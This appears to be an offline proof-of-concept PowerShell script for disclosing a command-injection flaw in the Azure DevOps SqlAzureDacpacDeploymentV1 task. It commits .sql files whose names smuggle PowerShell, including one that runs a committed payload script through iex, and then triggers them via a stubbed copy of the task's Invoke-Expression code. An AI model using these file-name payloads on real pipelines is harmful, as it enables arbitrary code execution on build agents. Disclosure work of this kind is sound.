# SqlAzureDacpacDeploymentV1: a committed .sql file NAME reaches Invoke-Expression.
# Offline. Nothing contacts a database, a network, or an Azure DevOps organization.
# Run: pwsh -NoProfile -File run.ps1

$ErrorActionPreference = 'Continue'
$lab = Join-Path ([System.IO.Path]::GetTempPath()) ("sqlazlab-" + [guid]::NewGuid().ToString('N').Substring(0,8))
Write-Host ("pwsh " + $PSVersionTable.PSVersion + " on " + [System.Environment]::OSVersion.Platform)
Write-Host ""

# ------------------------------------------------------------------ step 1
# The repository a contributor pushes. Three ordinary-looking files.
New-Item -ItemType Directory -Force -Path (Join-Path $lab 'repo/db') | Out-Null
Set-Content -Path (Join-Path $lab 'repo/db/payload.ps1') -Value '$env:RZ_STAGED = "STAGED-AS-" + [System.Environment]::UserName'

$controlName = 'migrate.sql'
$inlineName  = 'migrate$(ni rz-fired.txt).sql'
$stagedName  = 'migrate$(iex(gc((gci -r -fi payload.ps1).FullName))).sql'
foreach ($n in @($controlName, $inlineName, $stagedName)) {
    Set-Content -Path (Join-Path $lab "repo/db/$n") -Value 'SELECT 1;'
}

$reserved = '\','/',':','*','?',[char]34,'<','>','|'
Write-Host "STEP 1  the file names a contributor commits"
foreach ($n in @($controlName, $inlineName, $stagedName)) {
    $hits = @($reserved | Where-Object { $n.Contains($_) })
    Write-Host ("  name      : " + $n)
    Write-Host ("  extension : " + [System.IO.Path]::GetExtension($n) + "   (SqlAzureActions.ps1:256 requires .sql)")
    Write-Host ("  NTFS-reserved characters : " + $(if ($hits.Count -eq 0) { 'NONE' } else { $hits -join ' ' }))
}
Write-Host ""

# ------------------------------------------------------------------ step 2
# git accepts the names, records them, and a fresh clone writes them back unchanged.
Push-Location (Join-Path $lab 'repo')
git init -q . 2>&1 | Out-Null
git config user.email 'poc@example.invalid' | Out-Null
git config user.name 'poc' | Out-Null
git add -A 2>&1 | Out-Null
git commit -qm 'add migrations' 2>&1 | Out-Null
$tracked = git ls-files
Pop-Location
git clone -q (Join-Path $lab 'repo') (Join-Path $lab 'clone') 2>&1 | Out-Null

Write-Host "STEP 2  git delivery round trip"
Write-Host "  git ls-files:"
$tracked | ForEach-Object { Write-Host ("    " + $_) }
Write-Host "  db/ in a fresh clone:"
Get-ChildItem (Join-Path $lab 'clone/db') | ForEach-Object { Write-Host ("    " + $_.Name) }
Write-Host ""

# ------------------------------------------------------------------ step 3
# The task's own code shape. Invoke-Sqlcmd is stubbed so nothing reaches a database.
# The three numbered lines are copied from Tasks/SqlAzureDacpacDeploymentV1/SqlAzureActions.ps1.
function Invoke-Sqlcmd {
    param([string]$connectionString, [string]$Inputfile)
    Write-Host ("    Invoke-Sqlcmd received Inputfile = " + $Inputfile)
}
function Run-SqlCmd-Shape {
    param([string]$sqlFilePath)
    $connectionString = 'Server=tcp:contoso.database.windows.net;Database=app'
    $commandToRun  = "Invoke-Sqlcmd -connectionString `"$connectionString`" "   # :340
    $commandToRun += " -Inputfile `"$sqlFilePath`" "                            # :352
    Invoke-Expression $commandToRun                                             # :369
}

Push-Location (Join-Path $lab 'clone')
$env:RZ_STAGED = ''
Write-Host "STEP 3  the task's string construction and Invoke-Expression"
Write-Host "  CONTROL, an ordinary file name:"
Run-SqlCmd-Shape -sqlFilePath (Join-Path $lab "clone/db/$controlName")
Write-Host ("    rz-fired.txt on disk  = " + (Test-Path 'rz-fired.txt'))
Write-Host ("    staged marker         = '" + $env:RZ_STAGED + "'")
Write-Host ""
Write-Host "  INJECTED A, inline PowerShell in the file name:"
Run-SqlCmd-Shape -sqlFilePath (Join-Path $lab "clone/db/$inlineName")
Write-Host ("    rz-fired.txt on disk  = " + (Test-Path 'rz-fired.txt'))
Write-Host ""
Write-Host "  INJECTED B, the file name loads a committed script of any length:"
Run-SqlCmd-Shape -sqlFilePath (Join-Path $lab "clone/db/$stagedName")
Write-Host ("    staged marker         = '" + $env:RZ_STAGED + "'")
Pop-Location
Write-Host ""
Write-Host ("RESULT: arbitrary PowerShell from a committed file name executed = " + [bool]$env:RZ_STAGED)
Remove-Item -Recurse -Force $lab -ErrorAction SilentlyContinue
